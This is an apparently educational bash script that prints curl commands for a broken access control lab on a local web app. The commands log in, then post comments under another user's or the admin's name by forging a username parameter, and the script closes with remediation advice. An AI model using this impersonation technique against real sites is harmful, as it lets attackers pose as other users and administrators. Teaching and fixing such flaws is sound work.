#!/bin/bash
# BAC Comment Impersonation Examples
# Educational purposes only!

echo "🔓 BAC VULNERABILITY - COMMENT IMPERSONATION EXAMPLES"
echo "================================================================"
echo "These cURL commands demonstrate how to exploit BAC in comments"
echo "================================================================"

BASE_URL="http://127.0.0.1:5002"

echo ""
echo "📋 STEP 1: First login and get session cookie"
echo "Run this command and save the Set-Cookie header:"
echo ""
echo "curl -i -X POST $BASE_URL/login \\"
echo "  -d 'username=john_doe&password=password123' \\"
echo "  -c cookies.txt"

echo ""
echo "📋 STEP 2: Normal comment (legitimate)"
echo "curl -X POST $BASE_URL/add_comment \\"
echo "  -b cookies.txt \\"
echo "  -d 'product_id=1&comment=This is a normal comment&username=john_doe'"

echo ""
echo "🚨 STEP 3: BAC EXPLOIT - Impersonate ADMIN"
echo "curl -X POST $BASE_URL/add_comment \\"
echo "  -b cookies.txt \\"
echo "  -d 'product_id=1&comment=🔥 ADMIN COMMENT: This demonstrates BAC vulnerability!&username=admin'"

echo ""
echo "👤 STEP 4: BAC EXPLOIT - Impersonate another user"
echo "curl -X POST $BASE_URL/add_comment \\"
echo "  -b cookies.txt \\"
echo "  -d 'product_id=1&comment=Fake comment from jane_smith via BAC&username=jane_smith'"

echo ""
echo "🔍 STEP 5: Verify the attack - Check product page"
echo "curl -b cookies.txt $BASE_URL/product/1 | grep -i admin"

echo ""
echo "================================================================"
echo "🎯 WHAT THIS DEMONSTRATES:"
echo "- Users can post comments as ANY user including admin"
echo "- No server-side validation of username parameter"
echo "- Broken Access Control allows impersonation"
echo "- Comments will show as posted by the impersonated user"
echo ""
echo "🔧 HOW TO FIX:"
echo "- Always use server-side session data for user identity"
echo "- Never trust client-provided username/user_id parameters"
echo "- Implement proper access controls and validation"
echo "================================================================"

# Make the script executable
chmod +x "$0"
